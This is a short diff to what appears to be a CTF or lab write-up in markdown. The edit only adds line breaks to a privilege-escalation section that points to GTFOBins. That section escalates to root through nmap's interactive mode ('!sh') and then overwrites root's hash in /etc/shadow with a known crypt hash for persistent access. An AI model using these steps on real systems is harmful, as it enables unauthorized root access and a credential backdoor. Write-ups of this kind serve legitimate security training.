@@ -72,12 +72,12 @@ It is useful to have a simple hash if we need in any case.
 > https://gtfobins.github.io/ <br>
 > Useful site to find ways for privilege escalation.
 
-To escalate our privileges with nmap I do:
-`nmap --interactive`
+To escalate our privileges with nmap I do:<br>
+`nmap --interactive` <br>
 `!sh`
 
-Then modify the password of root in /etc/shadow to our known hash, so that you can easily access it again.
-`nano /etc/shadow`
+Then modify the password of root in /etc/shadow to our known hash, so that you can easily access it again.<br>
+`nano /etc/shadow`<br>
 `root:WVLY0mgH0RtUI:16753:0:99999:7:::`
 
 **Thank you for attention.**
